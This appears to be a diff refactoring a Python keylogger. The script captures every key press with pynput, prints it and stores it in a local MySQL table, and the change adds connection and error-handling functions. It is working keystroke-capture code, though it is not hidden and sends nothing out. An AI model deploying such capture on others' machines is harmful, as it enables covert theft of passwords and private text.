@@ -8,37 +8,34 @@ count = 0
 keys = []
 
 
-# Establish a connection to the MySQL database
-conn = mysql.connector.connect(
-    host='localhost',
-    user='your_username',
-    password='your_password',
-    database='your_database'
-)
-cursor = conn.cursor()
+# Function to establish a connection to the MySQL database
+def connect_to_database():
+    try:
+        conn = mysql.connector.connect(
+            host='localhost',
+            user='your_username',
+            password='your_password',
+            database='your_database'
+        )
+        cursor = conn.cursor()
 
-# Create a table to store the key presses
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS key_log (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        key_press TEXT
-    )
-''')
-conn.commit()
+        # Create a table to store key presses
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS key_log (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                key_press TEXT
+            )
+        ''')
+        conn.commit()
 
-def on_press(key):
-    global keys, count
+        return conn, cursor
 
-    keys.append(key)
-    count += 1
-    print("{0} pressed".format(key))
+    except mysql.connector.Error as e:
+        print(f"Error connecting to MySQL: {e}")
+        return None, None
 
-    if count >= 1:
-        count = 0
-        write_to_database(keys)
-        keys = []
-
-def write_to_database(keys):
+# Function to write key presses to the database
+def write_to_database(conn, cursor, keys):
     key_str = ""
     for key in keys:
         k = str(key).replace("'", "")
@@ -55,19 +52,42 @@ def write_to_database(keys):
         elif k.find("Key"):
             key_str += k
 
-    # Insert the key presses into the database
-    cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (key_str,))
-    conn.commit()
+    try:
+        # Insert the key presses into the database
+        cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (key_str,))
+        conn.commit()
+    except mysql.connector.Error as e:
+        print(f"Error writing to database: {e}")
 
-def on_release(key):
+# Function to handle key press event
+def on_press(key, conn, cursor):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+
+    if count >= 1:
+        count = 0
+        write_to_database(conn, cursor, keys)
+        keys = []
+
+# Function to handle key release event
+def on_release(key, conn):
     global exit
     if key == Key.esc:
         exit += 1
         if exit == 5:
             # Close the database connection when the program exits
-            conn.close()
+            if conn:
+                conn.close()
             return False
 
 exit = 0
-with Listener(on_press=on_press, on_release=on_release) as listener:
+
+# Establish a connection to the database
+conn, cursor = connect_to_database()
+
+with Listener(on_press=lambda key: on_press(key, conn, cursor),
+              on_release=lambda key: on_release(key, conn)) as listener:
     listener.join()
